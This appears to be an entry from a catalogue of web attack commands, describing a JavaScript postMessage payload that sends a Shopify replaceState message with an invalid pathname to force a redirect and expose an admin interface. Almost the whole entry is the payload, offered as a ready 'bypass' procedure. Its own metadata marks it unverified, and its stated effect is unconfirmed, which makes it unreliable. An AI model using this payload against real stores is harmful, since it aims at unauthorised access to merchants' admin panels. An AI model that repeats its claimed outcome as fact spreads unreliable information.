---
id: cmd-005
data: >-
  data
  =JSON.stringify({message:'Shopify.API.replaceState',data:{pathname:"invalid"}});ctx.postMessage(data)
tags:
  - bypass
  - invalid-path
type: command
output: 'Admin panel opens at /admininvalid, redirects to /password exposing interface'
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:18.362Z'
verified: false
validated: true
submitted: true
---
# attack-trigger-invalid-path-bypass

## Command

```javascript
const data = JSON.stringify({message:'Shopify.API.replaceState',data:{pathname:"invalid"}});
ctx.postMessage(data);
```

## Description

Sends invalid pathname via replaceState to cause redirect and expose admin.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| pathname | "invalid" to trigger failure | Yes |

## Examples

### Basic Usage

```javascript
JSON.stringify({message:'Shopify.API.replaceState',data:{pathname:"invalid"}})
```

### Advanced Usage

```javascript
ctx.postMessage(data)
```

## Expected Output

Redirect to /password; admin exposed.

## Related

- [[Related Procedure: Bypass-Prefix-with-Invalid-Path]]
